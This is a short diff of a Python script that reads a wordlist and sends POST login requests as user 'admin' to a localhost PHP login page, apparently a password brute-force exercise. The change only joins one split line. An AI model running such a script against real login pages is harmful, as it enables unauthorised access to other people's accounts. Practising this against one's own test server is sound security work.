@@ -12,8 +12,7 @@ wordsarray = words.split('\n')
 # do this for every word in the array
 for word in wordsarray:
 	# send post requests with username admin and your word in the list
-	result = requests.post(
-		'http://localhost:8888/php/login.php', data={'lgnm': 'admin', 'lgpw': word})
+	result = requests.post('http://localhost:8888/php/login.php', data={'lgnm': 'admin', 'lgpw': word})
 	# check if http response code is 200 OK
 	if result.status_code == 200:
 		# search the content for the magic string
